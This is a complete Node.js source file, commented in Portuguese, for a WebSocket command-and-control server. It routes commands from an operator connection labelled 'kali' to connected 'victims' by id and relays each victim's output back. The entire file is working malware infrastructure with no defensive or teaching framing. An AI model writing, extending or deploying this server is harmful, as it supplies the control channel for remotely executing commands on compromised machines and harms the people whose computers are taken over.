const WebSocket = require('ws');
const http = require('http');

const server = http.createServer((req, res) => { res.end("C2 Online"); });
const wss = new WebSocket.Server({ server });

const clients = { kali: null, victims: new Map() };

wss.on('connection', (ws, req) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    const id = url.searchParams.get('id') || `anon_${Math.random().toString(36).substr(2, 4)}`;
    const isKali = url.pathname.includes('kali');

    if (isKali) {
        clients.kali = ws;
        console.log("[!] KALI CONECTADO");
    } else {
        clients.victims.set(id, ws);
        console.log(`[+] VÍTIMA CONECTADA: ${id}`);
    }

    ws.on('message', (data) => {
        const message = data.toString();
        
        if (ws === clients.kali) {
            try {
                // Roteamento inteligente: O Kali manda { "to": "DAVID", "cmd": "calc" }
                const obj = JSON.parse(message);
                const target = clients.victims.get(obj.to);
                if (target) target.send(obj.cmd); // Manda o comando puro (texto)
            } catch (e) { console.log("Erro no roteamento"); }
        } else {
            // Se a vítima fala, manda pro Kali
            if (clients.kali) clients.kali.send(JSON.stringify({ from: id, data: message }));
        }
    });

    ws.on('close', () => { 
        if (ws === clients.kali) clients.kali = null; 
        else clients.victims.delete(id);
    });
});

setInterval(() => { wss.clients.forEach(ws => ws.ping()); }, 25000);
server.listen(process.env.PORT || 10000);
